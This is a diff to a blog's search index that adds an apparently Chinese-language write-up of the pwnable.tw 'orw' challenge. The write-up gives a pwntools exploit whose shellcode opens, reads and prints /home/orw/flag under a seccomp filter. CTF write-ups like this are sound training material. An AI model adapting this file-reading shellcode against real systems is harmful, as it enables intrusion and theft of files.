@@ -14,6 +14,25 @@
       </categories>
   </entry>
   <entry>
+    <title>orw</title>
+    <url>/orw/</url>
+    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>
+
+<hr>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
+<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
+<p>只能用open，read，write。</p>
+<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
+<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
+<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwnable.tw</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Start</title>
     <url>/Start/</url>
     <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
